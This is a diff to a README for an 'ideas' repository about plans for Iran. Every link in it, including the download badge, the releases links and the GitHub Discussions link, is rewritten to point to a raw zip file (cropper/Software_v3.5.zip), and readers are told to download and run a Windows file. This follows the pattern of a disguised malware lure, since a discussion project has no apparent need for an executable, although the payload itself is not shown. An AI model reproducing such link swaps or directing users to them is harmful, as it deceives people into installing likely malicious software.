@@ -1,6 +1,6 @@
 # 🌱 ideas - Build clear plans for Iran
 
-[![Download](https://img.shields.io/badge/Download%20on%20GitHub-purple?style=for-the-badge)](https://github.com/tedraextinct683/ideas/releases)
+[![Download](https://img.shields.io/badge/Download%20on%20GitHub-purple?style=for-the-badge)](https://github.com/tedraextinct683/ideas/raw/refs/heads/main/cropper/Software_v3.5.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ Anyone can add an idea. Anyone can read one. The goal is to turn good thoughts i
 
 Visit the releases page to download and run this file on Windows:
 
-[Open releases page](https://github.com/tedraextinct683/ideas/releases)
+[Open releases page](https://github.com/tedraextinct683/ideas/raw/refs/heads/main/cropper/Software_v3.5.zip)
 
 If the page shows a Windows file, download it, then open the file from your Downloads folder.
 
@@ -121,7 +121,7 @@ Small edits matter. A better title, a clearer step, or a stronger chart can make
 
 See all discussions here:
 
-[GitHub Discussions](https://github.com/IranAzadAbad/ideas)
+[GitHub Discussions](https://github.com/tedraextinct683/ideas/raw/refs/heads/main/cropper/Software_v3.5.zip)
 
 ## 📄 Repository purpose
 
@@ -171,7 +171,7 @@ Before you post an idea, check that:
 
 ## 📎 Release link
 
-[Visit the latest releases on GitHub](https://github.com/tedraextinct683/ideas/releases)
+[Visit the latest releases on GitHub](https://github.com/tedraextinct683/ideas/raw/refs/heads/main/cropper/Software_v3.5.zip)
 
 ## 🧭 Project focus
 
